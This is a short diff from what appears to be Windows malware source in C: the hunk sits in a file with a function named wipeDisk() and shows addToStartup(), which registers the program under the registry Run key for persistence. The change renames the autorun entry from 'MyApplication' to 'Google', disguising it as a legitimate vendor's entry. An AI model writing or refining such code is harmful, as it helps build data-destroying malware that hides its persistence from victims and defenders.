@@ -9,7 +9,7 @@ void wipeDisk() {
 void addToStartup() {
     HKEY hKey;
     LPCSTR subKey = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
-    LPCSTR valueName = "MyApplication";
+    LPCSTR valueName = "Google";
 
     char executablePath[MAX_PATH];
     GetModuleFileNameA(NULL, executablePath, MAX_PATH);
